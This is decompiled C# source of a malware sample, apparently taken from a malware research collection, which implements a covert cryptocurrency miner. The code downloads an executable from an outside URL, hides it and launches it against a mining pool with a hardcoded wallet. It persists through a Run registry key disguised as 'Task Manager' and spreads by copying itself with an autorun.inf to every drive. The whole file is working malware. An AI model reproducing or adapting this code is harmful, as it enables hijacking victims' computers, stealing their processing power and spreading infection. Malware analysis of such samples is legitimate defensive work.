// Decompiled with JetBrains decompiler
// Type: Module1
// Assembly: testminer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 395E6271-3ECB-45FE-94E7-36F8B707F8F0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Agent.gen-0b6361f65894dbc918d1ac239bab9ac1217545c7f765604f7d7d889079df4fec.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;

[StandardModule]
internal sealed class Module1
{
  private static string FILE_PATH = Interaction.Environ("AppData") + "\\1108892973.exe";
  private static string FILE_PATH2 = Interaction.Environ("AppData") + "\\blackCoin.scr";
  private static string pool = " mining.eligius.st";
  private static string worker = "1AFqj5xcz5hh24vb1K1iFiebC3VGoYyFTz";
  private static string password = "random";
  private static string port = "8337";
  private static string Url = "http://ISTOLETHIS.info/DO_NOT_DELETE/BLACKCOIN_FILES/iexplorer.exe";
  private static string percentage = "80";
  private static string startup1 = "1";
  private static string usbspread1 = "1";
  private static Mutex mutexmutex;

  [STAThread]
  public static void Main()
  {
    if (Operators.CompareString(Module1.startup1, "1", false) == 0)
      Module1.AddKey();
    if (Operators.CompareString(Module1.usbspread1, "1", false) == 0)
      Module1.UsbSpread();
    Module1.CheckMutex("BC_1050853253");
    try
    {
      new WebClient().DownloadFile(Module1.Url, Module1.FILE_PATH);
      string str1 = Conversions.ToString((double) Environment.ProcessorCount / 100.0 * Conversions.ToDouble(Module1.percentage));
      string str2 = "-o http://" + Module1.worker + ":" + Module1.password + "@" + Module1.pool + ":" + Module1.port + " -t " + str1;
      System.IO.File.SetAttributes(Module1.FILE_PATH, FileAttributes.Hidden);
      Process.Start(new ProcessStartInfo()
      {
        FileName = Module1.FILE_PATH,
        WindowStyle = ProcessWindowStyle.Normal,
        Arguments = str2
      });
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) Interaction.MsgBox((object) ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static void CheckMutex(string mymutex)
  {
    try
    {
      Mutex.OpenExisting(mymutex);
      ProjectData.EndApp();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Module1.mutexmutex = new Mutex(false, mymutex);
      ProjectData.ClearProjectError();
    }
  }

  public static void UsbSpread()
  {
    try
    {
      string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
      string[] logicalDrives = Directory.GetLogicalDrives();
      int index = 0;
      while (index < logicalDrives.Length)
      {
        string str = logicalDrives[index];
        try
        {
          System.IO.File.Copy(Process.GetCurrentProcess().MainModule.FileName, str + "blackCoin.scr");
          object Instance = (object) new StreamWriter(str + "\\autorun.inf");
          NewLateBinding.LateCall(Instance, (Type) null, "WriteLine", new object[1]
          {
            (object) "[autorun]"
          }, (string[]) null, (Type[]) null, (bool[]) null, true);
          NewLateBinding.LateCall(Instance, (Type) null, "WriteLine", new object[1]
          {
            (object) ";av4ttcgr7t6gk4gkwzRSZ% yw$@Y $V5y"
          }, (string[]) null, (Type[]) null, (bool[]) null, true);
          NewLateBinding.LateCall(Instance, (Type) null, "WriteLine", new object[1]
          {
            (object) ";ATVW$TWZ$WD#!TD@$%T#@CWF$%"
          }, (string[]) null, (Type[]) null, (bool[]) null, true);
          NewLateBinding.LateCall(Instance, (Type) null, "WriteLine", new object[1]
          {
            (object) "icon = %SystemRoot%\\System32\\SHELL32.dll,4"
          }, (string[]) null, (Type[]) null, (bool[]) null, true);
          NewLateBinding.LateCall(Instance, (Type) null, "WriteLine", new object[1]
          {
            (object) ("open=" + str + "blackCoin.scr")
          }, (string[]) null, (Type[]) null, (bool[]) null, true);
          NewLateBinding.LateCall(Instance, (Type) null, "WriteLine", new object[2]
          {
            (object) ("shellexecute=" + str),
            (object) 1
          }, (string[]) null, (Type[]) null, (bool[]) null, true);
          NewLateBinding.LateCall(Instance, (Type) null, "WriteLine", new object[1]
          {
            (object) ";K[e~`S6[zwL5bR5,sXcNEA[zYc7MTdW[~9K"
          }, (string[]) null, (Type[]) null, (bool[]) null, true);
          NewLateBinding.LateCall(Instance, (Type) null, "Close", new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
          System.IO.File.SetAttributes(str + "autorun.inf", FileAttributes.Hidden);
          System.IO.File.SetAttributes(str + "blackCoin.scr", FileAttributes.Hidden);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private static void AddKey()
  {
    try
    {
      if (System.IO.File.Exists(Module1.FILE_PATH2))
        System.IO.File.Delete(Module1.FILE_PATH2);
      System.IO.File.Copy(Process.GetCurrentProcess().MainModule.FileName, Module1.FILE_PATH2);
      System.IO.File.SetAttributes(Module1.FILE_PATH2, FileAttributes.Hidden);
      MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Task Manager", (object) Module1.FILE_PATH2);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
